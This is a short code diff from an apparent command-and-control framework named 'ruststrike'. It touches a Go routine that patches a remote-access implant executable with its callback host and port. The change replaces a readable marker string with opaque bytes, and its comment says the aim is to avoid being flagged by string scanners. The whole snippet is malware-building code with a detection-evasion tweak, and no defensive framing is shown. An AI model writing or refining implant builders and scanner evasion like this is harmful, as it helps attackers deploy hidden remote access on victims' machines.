@@ -6,7 +6,7 @@ package main
 // if absent it falls back to args[1]/args[2].
 //
 // Trailer layout (appended to the exe bytes):
-//   <exe bytes>... <padding to align> "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"
+//   <exe bytes>... <padding to align> <TrailerMagic> <host> "\x00" <port> "\x00"
 //
 // The magic + NUL-delimited fields are binary-safe. The implant reads only the
 // last ~256 bytes to find it, so keep the trailer short.
@@ -23,7 +23,9 @@ import (
 )
 
 // TrailerMagic is the marker the implant searches for near the end of its exe.
-var TrailerMagic = []byte("RUSTSTRIKE\x01")
+// Opaque byte sequence (not a readable word) so it isn't a string-scan
+// telltale; must match crates/implant/src/main.rs::TRAILER_MAGIC.
+var TrailerMagic = []byte{0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3}
 
 // PatchImplant returns the base implant exe bytes with a host:port trailer
 // appended. baseExe is the path to a prebuilt ruststrike-implant.exe.
